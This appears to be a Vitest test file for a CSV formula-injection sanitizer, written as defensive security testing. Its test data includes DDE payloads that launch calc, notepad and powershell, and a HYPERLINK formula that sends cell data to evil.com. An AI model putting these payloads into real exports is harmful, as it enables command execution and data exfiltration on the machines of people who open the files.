/**
 * Tests for CSV Injection Protection utilities.
 *
 * @see https://owasp.org/www-community/attacks/CSV_Injection
 */

import { describe, expect, it, vi } from "vitest";
import { escapeCSV } from "../../../src/exporters/shared/exporter-utils.js";
import {
  getFormulaPrefixes,
  isFormulaSuspicious,
  sanitizeCSVField,
} from "../../../src/utils/security/csv-sanitizer.js";

describe("CSV Security", () => {
  describe("sanitizeCSVField", () => {
    describe("formula prefix detection", () => {
      it("should prefix '=' with single quote", () => {
        expect(sanitizeCSVField("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
        expect(sanitizeCSVField("=1+1")).toBe("'=1+1");
        expect(sanitizeCSVField("=cmd|' /C calc'!A0")).toBe("'=cmd|' /C calc'!A0");
      });

      it("should prefix '+' with single quote", () => {
        expect(sanitizeCSVField("+1-2-3")).toBe("'+1-2-3");
        expect(sanitizeCSVField("+SUM(A1)")).toBe("'+SUM(A1)");
      });

      it("should prefix '-' with single quote", () => {
        expect(sanitizeCSVField("-100")).toBe("'-100");
        expect(sanitizeCSVField("-SUM(A1)")).toBe("'-SUM(A1)");
      });

      it("should prefix '@' with single quote", () => {
        expect(sanitizeCSVField("@username")).toBe("'@username");
        expect(sanitizeCSVField("@SUM(A1)")).toBe("'@SUM(A1)");
      });

      it("should prefix tab character with single quote", () => {
        expect(sanitizeCSVField("\tmalicious")).toBe("'\tmalicious");
      });

      it("should prefix carriage return with single quote", () => {
        expect(sanitizeCSVField("\rmalicious")).toBe("'\rmalicious");
      });

      it("should handle whitespace-padded formulas", () => {
        // Trims first, then checks prefix
        expect(sanitizeCSVField("  =SUM(A1)")).toBe("'=SUM(A1)");
        expect(sanitizeCSVField("  +100")).toBe("'+100");
      });
    });

    describe("safe content passthrough", () => {
      it("should not modify normal text", () => {
        expect(sanitizeCSVField("Normal text")).toBe("Normal text");
        expect(sanitizeCSVField("Hello, World!")).toBe("Hello, World!");
      });

      it("should not modify numbers as strings", () => {
        expect(sanitizeCSVField("12345")).toBe("12345");
        expect(sanitizeCSVField("3.14159")).toBe("3.14159");
      });

      it("should not modify URLs", () => {
        expect(sanitizeCSVField("https://example.com")).toBe("https://example.com");
      });

      it("should not modify text with formula chars in middle", () => {
        expect(sanitizeCSVField("2+2=4")).toBe("2+2=4");
        expect(sanitizeCSVField("email@example.com")).toBe("email@example.com");
        expect(sanitizeCSVField("a-b-c")).toBe("a-b-c");
      });
    });

    describe("edge cases", () => {
      it("should handle null values", () => {
        expect(sanitizeCSVField(null)).toBe(null);
      });

      it("should handle undefined values", () => {
        expect(sanitizeCSVField(undefined)).toBe(undefined);
      });

      it("should handle empty string", () => {
        expect(sanitizeCSVField("")).toBe("");
      });

      it("should handle single character formulas", () => {
        expect(sanitizeCSVField("=")).toBe("'=");
        expect(sanitizeCSVField("+")).toBe("'+");
        expect(sanitizeCSVField("-")).toBe("'-");
        expect(sanitizeCSVField("@")).toBe("'@");
      });
    });
  });

  describe("isFormulaSuspicious", () => {
    it("should detect formula prefixes", () => {
      expect(isFormulaSuspicious("=HYPERLINK(...)")).toBe(true);
      expect(isFormulaSuspicious("+calc")).toBe(true);
      expect(isFormulaSuspicious("-100")).toBe(true);
      expect(isFormulaSuspicious("@mention")).toBe(true);
    });

    it("should not flag normal content", () => {
      expect(isFormulaSuspicious("Regular text")).toBe(false);
      expect(isFormulaSuspicious("2+2=4")).toBe(false);
      expect(isFormulaSuspicious("email@example.com")).toBe(false);
    });

    it("should handle null/undefined/empty", () => {
      expect(isFormulaSuspicious(null)).toBe(false);
      expect(isFormulaSuspicious(undefined)).toBe(false);
      expect(isFormulaSuspicious("")).toBe(false);
    });
  });

  describe("getFormulaPrefixes", () => {
    it("should return all known formula prefixes", () => {
      const prefixes = getFormulaPrefixes();
      expect(prefixes).toContain("=");
      expect(prefixes).toContain("+");
      expect(prefixes).toContain("-");
      expect(prefixes).toContain("@");
      expect(prefixes).toContain("\t");
      expect(prefixes).toContain("\r");
    });
  });

  describe("sanitization options", () => {
    describe("mode: escape (default)", () => {
      it("should prefix with single quote", () => {
        expect(sanitizeCSVField("=SUM(A1)", { mode: "escape" })).toBe("'=SUM(A1)");
      });

      it("should be the default behavior", () => {
        expect(sanitizeCSVField("=formula")).toBe(sanitizeCSVField("=formula", { mode: "escape" }));
      });
    });

    describe("mode: reject", () => {
      it("should return empty string for dangerous content", () => {
        expect(sanitizeCSVField("=SUM(A1)", { mode: "reject" })).toBe("");
        expect(sanitizeCSVField("+100", { mode: "reject" })).toBe("");
        expect(sanitizeCSVField("-50", { mode: "reject" })).toBe("");
        expect(sanitizeCSVField("@mention", { mode: "reject" })).toBe("");
      });

      it("should pass through safe content", () => {
        expect(sanitizeCSVField("Normal text", { mode: "reject" })).toBe("Normal text");
        expect(sanitizeCSVField("email@example.com", { mode: "reject" })).toBe("email@example.com");
      });
    });

    describe("onSuspicious callback", () => {
      it("should call callback when suspicious content detected", () => {
        const callback = vi.fn();
        sanitizeCSVField("=formula", { onSuspicious: callback });

        expect(callback).toHaveBeenCalledTimes(1);
        expect(callback).toHaveBeenCalledWith("=formula", "'=formula");
      });

      it("should not call callback for safe content", () => {
        const callback = vi.fn();
        sanitizeCSVField("Normal text", { onSuspicious: callback });

        expect(callback).not.toHaveBeenCalled();
      });

      it("should provide sanitized result in callback", () => {
        const results: [string, string][] = [];
        sanitizeCSVField("=SUM", {
          mode: "reject",
          onSuspicious: (val, sanitized) => results.push([val, sanitized]),
        });

        expect(results).toEqual([["=SUM", ""]]);
      });
    });
  });

  describe("escapeCSV integration", () => {
    it("should sanitize and escape formula injections", () => {
      // escapeCSV wraps in quotes and sanitizes formulas
      const result = escapeCSV("=SUM(A1:A10)");
      expect(result).toBe('"\'=SUM(A1:A10)"');
    });

    it("should handle complex formula injection attempts", () => {
      // DDE attack attempt
      const ddePayload = "=cmd|' /C calc'!A0";
      const result = escapeCSV(ddePayload);
      expect(result).toBe("\"'=cmd|' /C calc'!A0\"");
    });

    it("should still escape quotes correctly", () => {
      const result = escapeCSV('Text with "quotes"');
      expect(result).toBe('"Text with ""quotes"""');
    });

    it("should still replace newlines with spaces", () => {
      const result = escapeCSV("Line1\nLine2\rLine3");
      expect(result).toBe('"Line1 Line2 Line3"');
    });

    it("should handle empty values", () => {
      expect(escapeCSV("")).toBe('""');
    });

    it("should sanitize formulas even with special chars", () => {
      const result = escapeCSV('=SUM("A1:A10")');
      // First sanitized (prefix '), then quotes escaped
      expect(result).toBe('"\'=SUM(""A1:A10"")"');
    });
  });

  describe("real-world attack vectors", () => {
    it("should protect against HYPERLINK payload", () => {
      const payload = '=HYPERLINK("http://evil.com?data="&A1,"Click here")';
      expect(sanitizeCSVField(payload)).toMatch(/^'/);
    });

    it("should protect against DDE payload", () => {
      const payload = "=cmd|' /C powershell -Command \"...\"'!A0";
      expect(sanitizeCSVField(payload)).toMatch(/^'/);
    });

    it("should protect against macro execution", () => {
      const payload = "@SUM(1+1)*cmd|' /C notepad'!A0";
      expect(sanitizeCSVField(payload)).toMatch(/^'/);
    });

    it("should protect against data exfiltration via concatenation", () => {
      const payload = '=CONCATENATE(A1,"-",B1)';
      expect(sanitizeCSVField(payload)).toMatch(/^'/);
    });
  });
});
